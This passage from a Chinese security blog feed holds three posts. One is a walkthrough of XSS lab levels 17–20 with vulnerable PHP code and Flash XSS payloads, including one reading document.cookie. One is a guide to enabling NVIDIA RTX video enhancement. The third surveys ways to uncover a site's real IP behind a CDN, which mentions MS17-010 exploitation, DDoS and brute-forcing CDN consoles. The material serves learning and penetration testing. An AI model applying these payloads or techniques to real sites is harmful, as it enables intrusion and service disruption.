src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/058-image.jpg"></p><h2 id="后台源代码分析-16"><a href="#后台源代码分析-16" class="headerlink" title="后台源代码分析"></a>后台源代码分析</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">&lt;?php<br>ini_set(&quot;display_errors&quot;, 0);<br>echo &quot;&lt;embed src=xsf01.swf?&quot;.htmlspecialchars($_GET[&quot;arg01&quot;]).&quot;=&quot;.htmlspecialchars($_GET[&quot;arg02&quot;]).&quot; width=100% heigth=100%&gt;&quot;;<br>?&gt;<br>&lt;h2 align=center&gt;成功后，&lt;a href=level 18.php?arg01=a&amp;arg02=b&gt;点我进入下一关&lt;/a&gt;&lt;/h2&gt;<br></code></pre></td></tr></table></figure><p>这里用到了<code>&lt;embed&gt;</code>标签，是用来嵌入图片的。将get提交的arg01和arg02参数用<code>htmlspecialchars</code>函数把预定义的字符转换为 HTML 实体。</p><p>因为这里arg01和arg02这两个参数是互相拼接起来的，所以比如在输入arg01参数时在其后面加一个空格，当浏览器解析到它的时候就会停止判断，然后将<code>onmouseover</code>事件看作另外一个属性；arg02参数同理。</p><h2 id="level-18：同level-17"><a href="#level-18：同level-17" class="headerlink" title="level 18：同level 17"></a>level 18：同level 17</h2><h2 id="过程-17"><a href="#过程-17" class="headerlink" title="过程"></a>过程</h2><p>只能说是和level 17一模一样了，除了图片不同。直接用level 17的payload直接通关。</p><h2 id="后台源代码分析-17"><a href="#后台源代码分析-17" class="headerlink" title="后台源代码分析"></a>后台源代码分析</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">&lt;?php<br>ini_set(&quot;display_errors&quot;, 0);<br>echo &quot;&lt;embed src=xsf02.swf?&quot;.htmlspecialchars($_GET[&quot;arg01&quot;]).&quot;=&quot;.htmlspecialchars($_GET[&quot;arg02&quot;]).&quot; width=100% heigth=100%&gt;&quot;;<br>?&gt;<br></code></pre></td></tr></table></figure><p>emmm，这里除了swf的文件名改成了xsf02.swf，其它都和level 17差不多。</p><h2 id="level-19：flash-xss-反编译"><a href="#level-19：flash-xss-反编译" class="headerlink" title="level 19：flash xss(反编译)"></a>level 19：flash xss(反编译)</h2><h2 id="过程-18"><a href="#过程-18" class="headerlink" title="过程"></a>过程</h2><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/059-image.jpg"></p><p>右键查看原始的页面代码，发现访问<code>swf</code>文件的时候在传参</p><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/060-image.jpg"></p><p>直接访问这个链接后，页面就是上面那样了：</p><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/061-image.jpg"></p><p>这里可以看到文件(即<code>flash</code>文件)里面提示了<code>sifr.js</code>是没有定义的。这不仅仅是个图片，需要对<code>swf</code>文件(即<code>flash</code>文件)进行反编译查看源码。这里使用的是<code>jpex</code>工具，它是针对flash的反编译工具。链接在这里：<a href="https://github.com/jindrapetrik/jpexs-decompiler">GitHub - jindrapetrik&#x2F;jpexs-decompiler: JPEXS Free Flash Decompiler</a></p><p>具体反编译过程也可以参考这篇文章：<a href="https://blog.csdn.net/weixin_50464560/article/details/119211168">Flash XSS漏洞快速上手</a></p><p>这里也讲讲这里的过程：</p><p>我通过<code>sifr</code>找到了对应的脚本位置：</p><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/062-image.jpg"></p><p>在这个脚本中我找到了<code>flash</code>显示的信息，关键在<code>%s</code>这里：</p><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/063-image.jpg"></p><p>接着去定位<code>%s</code>：</p><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/064-image.jpg"></p><p>这里先把<code>VERSION_WARNING</code>以<code>%s</code>打散成数组，然后再以<code>version</code>的方式组合成字符串。可是搜索了一圈，并没有<code>version</code>，只通过<code>p-code</code>发现了这样的一个东西：</p><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/065-image.jpg"></p><p>感觉这里是通过<code>url</code>来获取参数值的，于是构造了一个这样的参数<code>?arg01=version&amp;arg02=123</code>。结果也不出所料，出现了<code>123</code>:</p><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/066-image.jpg"></p><p>经过了许多种的尝试过后了，测试出了只有<code>&lt;a&gt;</code>这种是可以的，那么就构造payload：<code>?arg01=version&amp;arg02=&lt;a href=&quot;javascript:alert(/xss/)&quot;&gt;xss&lt;/a&gt;</code></p><p>然后页面出现了<code>xss</code>，点击就成功了。</p><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/067-image.jpg"></p><h2 id="后台源代码分析-18"><a href="#后台源代码分析-18" class="headerlink" title="后台源代码分析"></a>后台源代码分析</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">&lt;?php<br>ini_set(&quot;display_errors&quot;, 0);<br>echo &#x27;&lt;embed src=&quot;xsf03.swf?&#x27;.htmlspecialchars($_GET[&quot;arg01&quot;]).&quot;=&quot;.htmlspecialchars($_GET[&quot;arg02&quot;]).&#x27;&quot; width=100% heigth=100%&gt;&#x27;;<br>?&gt;<br></code></pre></td></tr></table></figure><p>这里用到了<code>&lt;embed&gt;</code>标签，是用来嵌入图片的。将get提交的arg01和arg02参数用<code>htmlspecialchars</code>函数把预定义的字符转换为 HTML 实体。</p><h2 id="level-20：同level-19"><a href="#level-20：同level-19" class="headerlink" title="level 20：同level 19"></a>level 20：同level 19</h2><h2 id="过程-19"><a href="#过程-19" class="headerlink" title="过程"></a>过程</h2><p>这一关和level 19相似，这里直接给出payload。</p><p>payload：<code>?arg01=id&amp;arg02=\%22))&#125;catch(e)&#123;&#125;if(!self.a)self.a=!alert(document.cookie)//%26width%26height</code></p><h2 id="后台源代码分析-19"><a href="#后台源代码分析-19" class="headerlink" title="后台源代码分析"></a>后台源代码分析</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">&lt;?php<br>ini_set(&quot;display_errors&quot;, 0);<br>echo &#x27;&lt;embed src=&quot;xsf04.swf?&#x27;.htmlspecialchars($_GET[&quot;arg01&quot;]).&quot;=&quot;.htmlspecialchars($_GET[&quot;arg02&quot;]).&#x27;&quot; width=100% heigth=100%&gt;&#x27;;<br>?&gt;<br></code></pre></td></tr></table></figure><p>这里用到了<code>&lt;embed&gt;</code>标签，是用来嵌入图片的。将get提交的arg01和arg02参数用<code>htmlspecialchars</code>函数把预定义的字符转换为 HTML 实体。</p><p>参考原文：<a href="https://www.freebuf.com/vuls/287655.html">xss各种姿势的学习(包含绕过)和个人重要总结</a></p>]]></content>
    
    
    <categories>
      
      <category>网安</category>
      
      <category>漏洞专题</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>开启nvidia的rtx视频增强</title>
    <link href="/2024/10/14/%E5%85%B6%E5%AE%83/%E5%BC%80%E5%90%AFnvidia%E7%9A%84rtx%E8%A7%86%E9%A2%91%E5%A2%9E%E5%BC%BA/"/>
    <url>/2024/10/14/%E5%85%B6%E5%AE%83/%E5%BC%80%E5%90%AFnvidia%E7%9A%84rtx%E8%A7%86%E9%A2%91%E5%A2%9E%E5%BC%BA/</url>
    
    <content type="html"><![CDATA[<blockquote><p>RTX显卡由于具有特殊的硬件单元，可以通过将低分辨率画面转化为高分辨率画面。在游戏上老黄给了DLSS（Deep Learning Super Sampling，深度学习超级采样）技术。DLSS实际上就是将低分辨率的游戏画面变成高分辨率的画面，这样可以实现低分辨率的高帧率和高分辨率的高画质。AMD的FSR和Intel的XeSS的目的都是差不多的。</p></blockquote><blockquote><p>那么如果将DLSS类似的技术放到低分辨率视频上面呢？这就催生了NVIDIA显卡专属的RTX视频增强技术了</p></blockquote><h1 id="浏览器开启nvidia-RTX视频增强"><a href="#浏览器开启nvidia-RTX视频增强" class="headerlink" title="浏览器开启nvidia RTX视频增强"></a>浏览器开启nvidia RTX视频增强</h1><ol><li>首先更新到最新的nvidia驱动</li><li>打开nvidia控制面板：视频-&gt;调整视频图像设置，勾上rtx视频增强，质量建议选择自动。如下图所示<br><img src="/2024/10/14/%E5%85%B6%E5%AE%83/%E5%BC%80%E5%90%AFnvidia%E7%9A%84rtx%E8%A7%86%E9%A2%91%E5%A2%9E%E5%BC%BA/image.png"></li><li>更新chrome或者edge到最新版本，随便打开一个在线网页视频，或者将本地视频文件拖到浏览器打开，只要视频分辨率小于你当前的显示器分辨率，都可以享受到rtx视频增强技术了</li></ol><h1 id="本地播放器开启nvidia-RTX视频增强"><a href="#本地播放器开启nvidia-RTX视频增强" class="headerlink" title="本地播放器开启nvidia RTX视频增强"></a>本地播放器开启nvidia RTX视频增强</h1><blockquote><p>目前常见的支持nvidia RTX视频增强的本地视频播放器，推荐<a href="https://potplayer.daum.net/">Potplayer</a>和<a href="https://github.com/Aleksoid1978/MPC-BE">MPC-BE</a></p></blockquote><h2 id="Potplayer"><a href="#Potplayer" class="headerlink" title="Potplayer"></a>Potplayer</h2><ol><li><p>将NVIDIA驱动更新到 531.18 WHQL 版本，并在NVIDIA控制面板中“视频 - 调整视频图像设置 - RTX视频增强”打开超分辨率。</p></li><li><p>打开PotPlayer“选项 - 视频”，勾选“D3D11 GPU 超分辨率”，若无法勾选，先勾选视频缓冲格式后面的“10位输出”。。</p></li></ol><p><img src="/2024/10/14/%E5%85%B6%E5%AE%83/%E5%BC%80%E5%90%AFnvidia%E7%9A%84rtx%E8%A7%86%E9%A2%91%E5%A2%9E%E5%BC%BA/image-2.png"></p><p>可参考链接：<a href="http://www.potplayercn.com/course/video-super-resolution.html">PotPlayer超分辨率(VSR)功能 让低画质视频更高清</a></p><h2 id="MPC-BE"><a href="#MPC-BE" class="headerlink" title="MPC-BE"></a>MPC-BE</h2><ol><li>先下载GitHub项目<a href="https://github.com/emoose/VideoRenderer">VideoRenderer</a>渲染器，解压到本地</li></ol><p><img src="/2024/10/14/%E5%85%B6%E5%AE%83/%E5%BC%80%E5%90%AFnvidia%E7%9A%84rtx%E8%A7%86%E9%A2%91%E5%A2%9E%E5%BC%BA/image-3.png"></p><ol><li><p>先运行运行<code>Reset_Settings.cmd</code>初始化</p></li><li><p>然后运行<code>EnableVideoSuperRes.reg</code>文件改注册表</p></li><li><p>最后再运行<code>Install_MPCVR_64.cmd</code>安装渲染器</p></li></ol><blockquote><p><em><strong>注意：安装成功后，文件不能删除和更改位置，否则会失效</strong></em></p></blockquote><ol start="4"><li>打开MPC-BE播放器，选项，切换到视频菜单栏，视频渲染器选择<code>MPC 渲染器</code>。</li></ol><p><img src="/2024/10/14/%E5%85%B6%E5%AE%83/%E5%BC%80%E5%90%AFnvidia%E7%9A%84rtx%E8%A7%86%E9%A2%91%E5%A2%9E%E5%BC%BA/image-6.png"></p><ol start="5"><li>点击右边的属性</li></ol><p><img src="/2024/10/14/%E5%85%B6%E5%AE%83/%E5%BC%80%E5%90%AFnvidia%E7%9A%84rtx%E8%A7%86%E9%A2%91%E5%A2%9E%E5%BC%BA/image-7.png"></p><ol start="6"><li>把这两个打开就可以了</li></ol><p><img src="/2024/10/14/%E5%85%B6%E5%AE%83/%E5%BC%80%E5%90%AFnvidia%E7%9A%84rtx%E8%A7%86%E9%A2%91%E5%A2%9E%E5%BC%BA/image-8.png"></p><h1 id="验证启用-活动状态"><a href="#验证启用-活动状态" class="headerlink" title="验证启用&#x2F;活动状态"></a>验证启用&#x2F;活动状态</h1><p>有的小伙伴发现开了好像和没开没啥区别，那么如何验证是否成功开启了rtx视频增强呢？</p><p>只要观察nvidia控制面板上的状态这里，就可以显示当前的活动状态，以及级别。如下图所示</p><p><img src="/2024/10/14/%E5%85%B6%E5%AE%83/%E5%BC%80%E5%90%AFnvidia%E7%9A%84rtx%E8%A7%86%E9%A2%91%E5%A2%9E%E5%BC%BA/image-1.png"></p><p>打开任务管理器观察gpu的占用，你会发现开和没开是有明显的变动的，这得根据显卡的性能决定，性能越强的显卡占用越小，像我的3060ti开到最高（质量4）大概只占用个6%左右</p><p>没开前</p><p><img src="/2024/10/14/%E5%85%B6%E5%AE%83/%E5%BC%80%E5%90%AFnvidia%E7%9A%84rtx%E8%A7%86%E9%A2%91%E5%A2%9E%E5%BC%BA/image-4.png"></p><p>开启后</p><p><img src="/2024/10/14/%E5%85%B6%E5%AE%83/%E5%BC%80%E5%90%AFnvidia%E7%9A%84rtx%E8%A7%86%E9%A2%91%E5%A2%9E%E5%BC%BA/image-9.png"></p>]]></content>
    
    
    <categories>
      
      <category>其它</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>绕过CDN查找真实IP方法总结</title>
    <link href="/2024/08/20/%E7%BD%91%E5%AE%89/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%BB%95%E8%BF%87CDN%E6%9F%A5%E6%89%BE%E7%9C%9F%E5%AE%9EIP%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/"/>
    <url>/2024/08/20/%E7%BD%91%E5%AE%89/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%BB%95%E8%BF%87CDN%E6%9F%A5%E6%89%BE%E7%9C%9F%E5%AE%9EIP%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-CDN简述"><a href="#0x00-CDN简述" class="headerlink" title="0x00 CDN简述"></a>0x00 CDN简述</h2><blockquote><p>CDN全称ContentDeliveryNetwork，即内容分发网络，构建在现有网络基础之上的智能虚拟网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户能够就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。百度百科</p></blockquote><p><img src="/2024/08/20/%E7%BD%91%E5%AE%89/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%BB%95%E8%BF%87CDN%E6%9F%A5%E6%89%BE%E7%9C%9F%E5%AE%9EIP%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/001-0.webp" alt="图片"></p><h2 id="0x01-域名解析过程"><a href="#0x01-域名解析过程" class="headerlink" title="0x01 域名解析过程"></a>0x01 域名解析过程</h2><ul><li><p>传统访问：用户访问域名–&gt;解析IP–&gt;访问目标主机</p></li><li><p>简单模式：用户访问域名–&gt;CDN节点–&gt;真实IP–&gt;目标主机</p></li><li><p>360网站卫士：用户访问域名–&gt;CDN节点（云WAF）–&gt;真实IP–&gt;目标主机</p></li></ul><p><img src="/2024/08/20/%E7%BD%91%E5%AE%89/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%BB%95%E8%BF%87CDN%E6%9F%A5%E6%89%BE%E7%9C%9F%E5%AE%9EIP%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/002-0.webp" alt="图片"></p><p><strong>注：</strong>目前市面上大多数的CDN服务商都提供了云WAF配置选项，内置了多种安全防护策略，可对SQL注入、XSS跨站、Webshell上传、后门隔离保护、命令注入、恶意扫描等攻击行为进行有效拦截。</p><h2 id="0x02-CDN配置方法"><a href="#0x02-CDN配置方法" class="headerlink" title="0x02 CDN配置方法"></a>0x02 CDN配置方法</h2><ul><li><p>将域名的NS记录指向CDN厂商提供的DNS服务器。   </p></li><li><p>给域名设置一个cname记录，将它指向CDN厂商提供的另一个域名。</p></li></ul><h2 id="0x03-CDN检测方法"><a href="#0x03-CDN检测方法" class="headerlink" title="0x03 CDN检测方法"></a>0x03 CDN检测方法</h2><p>利用“全球Ping”快速检测目标是否存在CDN，如果得到的IP归属地是某CDN服务商，或者每个地区得到的IP地址都不一样则说明可能存在CDN，可用以下几个网站检测！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">https://wepcc.com<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">http://ping.chinaz.com<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">https://asm.ca.com/en/ping.php<br></code></pre></td></tr></table></figure><p><strong>注：</strong>全球Ping有一定机率可以得到目标服务器真实IP，因为有的CDN服务商可能没有某些地区的CDN节点。<img src="/2024/08/20/%E7%BD%91%E5%AE%89/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%BB%95%E8%BF%87CDN%E6%9F%A5%E6%89%BE%E7%9C%9F%E5%AE%9EIP%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/003-0.webp" alt="图片">   </p><h2 id="0x04-查找真实IP方法"><a href="#0x04-查找真实IP方法" class="headerlink" title="0x04 查找真实IP方法"></a>0x04 查找真实IP方法</h2><p><strong>(1) phpinfo等探针找到真实IP</strong>   </p><p>通过l.php、phpinfo.php等这类探针文件即可得到真实IP地址，phpinfo.php搜索SERVER_NAME。</p><p><img src="/2024/08/20/%E7%BD%91%E5%AE%89/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%BB%95%E8%BF%87CDN%E6%9F%A5%E6%89%BE%E7%9C%9F%E5%AE%9EIP%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/004-0.webp" alt="图片"></p><p><strong>(2) 网站根域或子域找到真实IP</strong></p><p>大部分CDN服务都是按流量进行收费的，所以一些网站管理员只会给重要业务部署CDN，也有很多人会忘了给顶级域名部署CDN，所以尽可能的多去搜集一些子域名能提高找到真实IP地址的机率。</p><p><img src="/2024/08/20/%E7%BD%91%E5%AE%89/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%BB%95%E8%BF%87CDN%E6%9F%A5%E6%89%BE%E7%9C%9F%E5%AE%9EIP%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/005-0.webp" alt="图片"></p><p><strong>注：</strong>有时多个子域名可能不会解析到同一台服务器，而是根据公司业务的重要与非重要性将子域名解析在内网或外网的不同服务器中，需要有一定的分析能力。</p><p><strong>(3) 利用邮件服务器找到真实IP</strong></p><p>Web和Email属同服务器时可以通过Email来查询目标真实IP地址，如果Web和Email属不同服务器时我们通过Email得到的可能只是邮件服务器的IP地址，所以在hosts文件中绑定真实IP后无法访问目标网站也属正常现象。常见发送邮件的功能有：注册用户、找回密码等。</p><p><img src="/2024/08/20/%E7%BD%91%E5%AE%89/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%BB%95%E8%BF%87CDN%E6%9F%A5%E6%89%BE%E7%9C%9F%E5%AE%9EIP%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/006-0.webp" alt="图片"></p><p><img src="/2024/08/20/%E7%BD%91%E5%AE%89/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%BB%95%E8%BF%87CDN%E6%9F%A5%E6%89%BE%E7%9C%9F%E5%AE%9EIP%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/007-0.webp" alt="图片"></p><p><img src="/2024/08/20/%E7%BD%91%E5%AE%89/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%BB%95%E8%BF%87CDN%E6%9F%A5%E6%89%BE%E7%9C%9F%E5%AE%9EIP%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/008-0.webp" alt="图片"></p><p> </p><p><strong>(4) 域名历史解析记录找到真实IP</strong></p><p>通过查询目标域名历史解析记录可能会找到部署CDN前的解析记录（真实IP地址），可以用以下几个网站来查询。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">https://domain.8aq.net    //基于Rapid7 Open Data<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">https://x.threatbook.cn<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">https://webiplookup.com<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">https://viewdns.info/iphistory<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">https://securitytrails.com/#search<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">https://toolbar.netcraft.com/site_report<br></code></pre></td></tr></table></figure><p><img src="/2024/08/20/%E7%BD%91%E5%AE%89/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%BB%95%E8%BF%87CDN%E6%9F%A5%E6%89%BE%E7%9C%9F%E5%AE%9EIP%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/009-0.webp" alt="图片"></p><p><img src="/2024/08/20/%E7%BD%91%E5%AE%89/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%BB%95%E8%BF%87CDN%E6%9F%A5%E6%89%BE%E7%9C%9F%E5%AE%9EIP%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/010-0.webp" alt="图片"></p><p><img src="/2024/08/20/%E7%BD%91%E5%AE%89/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%BB%95%E8%BF%87CDN%E6%9F%A5%E6%89%BE%E7%9C%9F%E5%AE%9EIP%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/011-0.webp" alt="图片"></p><p><img src="/2024/08/20/%E7%BD%91%E5%AE%89/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%BB%95%E8%BF%87CDN%E6%9F%A5%E6%89%BE%E7%9C%9F%E5%AE%9EIP%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/012-0.webp" alt="图片"></p><p><strong>(5) FOFA查询网站标题找到真实IP</strong></p><p>利用“FOFA网络空间安全搜索引擎”搜索目标网站源代码中的title标签内容即可得到真实IP地址。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">title=&quot;*** ***** – Multi Asset Fund&quot;<br></code></pre></td></tr></table></figure><p><img src="/2024/08/20/%E7%BD%91%E5%AE%89/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%BB%95%E8%BF%87CDN%E6%9F%A5%E6%89%BE%E7%9C%9F%E5%AE%9EIP%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/013-0.webp" alt="图片"></p><p><strong>(6) Censys查询SSL证书找到真实IP</strong></p><p>利用“Censys网络空间搜索引擎”搜索目标域名的SSL证书和HASH，<a href="https://crt.sh上查找他ssl证书的hash,然后再用censys搜索该hash值即可得到真实ip地址./">https://crt.sh上查找他SSL证书的HASH，然后再用Censys搜索该HASH值即可得到真实IP地址。</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">443.https.tls.certificate.parsed.extensions.subject_alt_name.dns_names:***trade.com<br></code></pre></td></tr></table></figure><p><img src="/2024/08/20/%E7%BD%91%E5%AE%89/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%BB%95%E8%BF%87CDN%E6%9F%A5%E6%89%BE%E7%9C%9F%E5%AE%9EIP%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/014-0.webp" alt="图片"></p><p><img src="/2024/08/20/%E7%BD%91%E5%AE%89/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%BB%95%E8%BF%87CDN%E6%9F%A5%E6%89%BE%E7%9C%9F%E5%AE%9EIP%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/015-0.webp" alt="图片"></p><p><img src="/2024/08/20/%E7%BD%91%E5%AE%89/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%BB%95%E8%BF%87CDN%E6%9F%A5%E6%89%BE%E7%9C%9F%E5%AE%9EIP%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/016-0.png" alt="图片"></p><p><strong>(7) 通过分析目标C段来判断真实IP</strong></p><p>这种方法得看目标有多少子域名吧，如果子域够多，且又有多台服务器（同段），找一个没有部署CDN的子域名，然后扫描整个C段查找与目标站Title一致的即可找到他的真实IP地址！</p><p> </p><p>目标站111.test.com解析在192.168.1.10，title：90sec社区，通过333.test.com子域名得到333真实IP地址192.168.1.12，然后扫描整个C段，当扫到192.168.1.10这个IP时发现一个title同为“90sec社区”的网站，域名也是111.test.com，这样就能确定192.168.1.10为真实IP了。</p><table><thead><tr><th></th><th></th><th></th></tr></thead><tbody><tr><td>网站域名</td><td>域名解析IP</td><td>CDN节点IP</td></tr><tr><td>111.test.com（目标）</td><td>192.168.1.10</td><td>8.8.8.8</td></tr><tr><td>222.test.com</td><td>192.168.1.11</td><td>9.9.9.9</td></tr><tr><td>333.test.com</td><td>192.168.1.12</td><td>没有CDN</td></tr></tbody></table><p><strong>(8) 自建CDN节点服务器找到真实IP</strong></p><p>这篇笔记当时没有记录下来，其实就是MS17-010刚出来时很多机器都还没打补丁，在批量过程中打了一台别人自建的CDN节点服务器，然后在里边发现很多解析到这边的IP地址，其实这些IP地址就是某些网站的真实IP，所以这也算是一种思路吧，但是得先拿到CDN节点服务器权限。或者可以通过DDOS攻击方式将其流量耗尽后即会显示真实IP，因为免费和自建CDN的流量都不会很多。   </p><p><strong>(9) 通过目标网站的漏洞找到真实IP</strong>Web安全漏洞：XSS、SSRF、命令执行、文件上传等，但可能需要先绕过云WAF安全防护。</p><p>敏感信息泄露：Apache status、Jboss status、SVN、Github等敏感信息和网页源代码泄露。</p><p> </p><p><strong>(10) 通过社工CDN控制台找到真实IP</strong>   </p><p>通过社会工程学将搜集到的信息组合生成用户名和密码字典对CDN控制台进行爆破或者手工尝试，但是得在没有验证码和登录次数限制的情况下，然后找到他的真实解析IP地址。</p><p><strong>(11) Zmap全网扫描及F5 LTM解码法</strong></p><p>这两种方法都是前辈们以前写的，个人感觉较为复杂，并没有亲自实践过，不知是否真的可行？   </p><p><strong>注意事项：</strong>部署CDN的网站有必要设置严格访问控制策略，仅允许CDN节点访问网站真实服务器80端口，这样设置的好处就是即使在hosts文件中绑定了真实IP后仍然无法访问。<br>笔者曾经在一次渗透测试过程中就遇到过类似情况，就是成功绑定了真实IP后，虽然能够正常访问到目标网站，但是仍然没有绕过云WAF，具体情况有点记不太清了，当时没有去细研究这个问题！</p>]]></content>
    
    
    <categories>
      
      <category>网安</category>
      
      <category>应急响应</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【超详细】Post文件上传BypassWAF汇总</title>
    <link href="/2024/08/20/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/%E3%80%90%E8%B6%85%E8%AF%A6%E7%BB%86%E3%80%91Post%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0BypassWAF%E6%B1%87%E6%80%BB/"/>
